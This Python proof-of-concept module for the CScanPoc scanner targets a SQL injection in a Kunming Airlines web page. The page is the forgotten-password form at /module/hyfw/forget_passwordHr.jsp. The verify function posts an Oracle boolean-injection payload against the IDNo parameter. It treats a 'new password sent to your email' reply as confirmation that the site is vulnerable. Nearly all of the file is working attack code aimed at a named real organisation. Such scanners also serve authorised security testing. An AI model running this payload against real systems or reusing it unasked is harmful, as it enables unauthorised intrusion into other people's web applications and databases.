# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Airkunming_0104' # 平台漏洞编号
    name = '昆明航空SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-26'  # 漏洞公布时间
    desc = '''
    昆明航空SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=207642
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Airkunming(昆明航空)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5e957034-59f9-4e42-b58b-b61b01a75f21' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/module/hyfw/forget_passwordHr.jsp"
            payload = "cname=mksxaafh&command=find&IDNo=-1' OR length(SYS_CONTEXT('USERENV','CURRENT_USER'))=3 or 'Y'='"
            response = requests.post(url,data=payload)
            if response.status_code==200 and u"新密码已经发到您的邮箱" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
